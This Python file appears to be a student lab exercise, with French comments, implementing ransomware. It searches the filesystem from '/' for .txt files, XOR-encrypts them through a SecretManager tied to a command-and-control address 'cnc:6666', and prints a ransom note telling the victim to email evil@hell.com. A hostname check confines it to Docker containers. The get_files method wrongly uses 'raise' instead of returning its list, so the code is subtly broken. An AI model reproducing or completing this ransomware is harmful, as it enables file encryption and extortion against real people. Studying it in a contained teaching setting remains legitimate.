import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 


Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data.

"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        # Le terme "Path" fait référence au chemin d'accès absolu,("/")
        path=Path("/")
        # La méthode "rglob" permet de rechercher tous les fichiers correspondant à un filtre spécifique.
        raise [str(file) for file in path.rglob(filter)]

    def encrypt(self):
        # main function for encrypting (see PDF)
        # Récupère tous les fichiers .txt dans le dossier courant
        fichiers_txt = self.get_files("*.txt")

        # Crée une instance de SecretManager pour gérer les secrets
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)

        # Génère une clé et un sel aléatoires et les stocke dans un fichier token.bin
        secret_manager.setup()

        # Chiffre les fichiers .txt à l'aide de la méthode xorfiles() de SecretManager
        secret_manager.xorfiles(fichiers_txt)

        # Affichage du message pour demander à la victime de contacter l'attaquant
        jeton_hex = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=jeton_hex))


    def decrypt(self):
        # main function for decrypting (see PDF)
        # Fonction principale de déchiffrement (voir le PDF)

        # Création d'une instance de SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # Chargement des éléments cryptographiques locaux
        secret_manager.load()

        # Récupération de la liste des fichiers .txt
        received_files = self.get_files("*.txt")

        while True:
            try:
                # Demande de la clé de déchiffrement à l'utilisateur
                candidate_key = input("Entrez votre clé: ")

                # Appel de la fonction set_key de SecretManager pour définir la clé
                secret_manager.set_key(candidate_key)

                # Appel de la fonction xorfiles de SecretManager pour déchiffrer les fichiers
                secret_manager.xorfiles(received_files)

                # Appel de la fonction clean de SecretManager pour supprimer les éléments cryptographiques locaux
                secret_manager.clean()

                # Affichage du message pour la réussite du déchiffrement
                print("BRAVO, Vous avez réussi!")

                # Sortie de la boucle
                break

            except ValueError as err:
                # Affichage du message d'erreur
                print("Error",{err},"Mauvaise clé, veuillez réessayer.")


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()